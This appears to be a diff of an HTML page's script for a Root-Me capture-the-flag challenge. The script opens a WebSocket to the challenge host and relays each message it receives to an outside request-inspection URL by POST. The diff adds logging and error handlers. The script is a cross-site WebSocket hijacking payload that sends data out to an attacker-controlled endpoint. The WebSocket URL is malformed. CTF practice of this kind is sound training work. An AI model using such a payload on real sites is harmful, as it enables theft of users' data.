@@ -4,10 +4,21 @@
   <script>
     var ws = new WebSocket('ws://http://ctf30.root-me.org/ws');
     ws.onopen = function() {
+      console.log("WebSocket connection opened successfully.");
       ws.send("READY");
     };
     ws.onmessage = function(event) {
-      fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?' + event.data, { method: 'POST', mode: 'no-cors', body: event.data });
+      console.log("Message received: " + event.data);
+      fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?' + event.data, { method: 'POST', mode: 'no-cors', body: event.data })
+        .then(function(response) {
+          console.log("Fetch request successful.");
+        })
+        .catch(function(error) {
+          console.error("Fetch request error:", error);
+        });
+    };
+    ws.onerror = function(error) {
+      console.error("WebSocket connection error:", error);
     };
   </script>
 </body>
